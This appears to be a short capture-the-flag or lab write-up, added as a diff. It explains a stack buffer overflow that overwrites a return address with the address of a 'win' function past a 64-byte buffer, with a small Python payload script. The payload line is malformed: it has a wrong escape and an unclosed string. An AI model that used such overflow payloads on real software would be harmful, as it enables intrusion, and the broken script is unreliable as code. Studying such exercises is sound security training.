@@ -1,0 +1,15 @@
+This one is like the first one but ovewritting an address
+
+The steps are the same:
+1) Open gbd, do reasearch stuff (inf ways to do that)
+2) Find the address of win function
+3) Overwrite the 64bytes buffer and append the address of win (in litle endian)
+4) End !
+
+I ve used that python script
+
+padding = "A"*64
+padding += "\24x\x84\x04\x08
+print padding
+
+# where the address to append is 0x08048424 but reversed to match little endian
